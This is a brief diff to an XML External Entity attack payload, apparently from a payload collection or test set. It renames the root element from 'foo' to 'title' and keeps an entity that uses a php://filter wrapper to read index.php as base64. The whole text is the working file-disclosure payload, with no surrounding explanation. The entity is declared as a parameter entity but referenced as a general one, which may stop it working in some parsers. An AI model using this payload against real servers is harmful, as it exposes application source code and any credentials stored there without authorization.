@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [
-<!ELEMENT foo ANY >
+<!DOCTYPE title [
+<!ELEMENT title ANY >
 <!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" >
 ]>
-<foo>&xxe;</foo>
+<title>&xxe;</title>
